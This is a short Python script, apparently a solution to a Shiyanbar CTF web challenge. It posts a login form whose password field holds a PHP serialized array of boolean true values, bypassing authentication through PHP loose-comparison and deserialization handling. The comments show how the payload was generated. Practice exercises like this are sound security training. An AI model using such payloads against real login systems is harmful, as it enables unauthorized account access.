# -*- coding: utf-8 -*-
##天网管理系统
##题目链接，http://www.shiyanbar.com/ctf/1810
import requests

##php在线工具
##https://c.runoob.com/compile/1
##<?php
##echo serialize(array("user"=>true,"pass"=>true));
##?>

url = 'http://ctf5.shiyanbar.com/10/web1/index.php'
payload = {'username': 'admin', 'password': 'a:2:{s:4:"user";b:1;s:4:"pass";b:1;}'}
print requests.post(url, data = payload).content
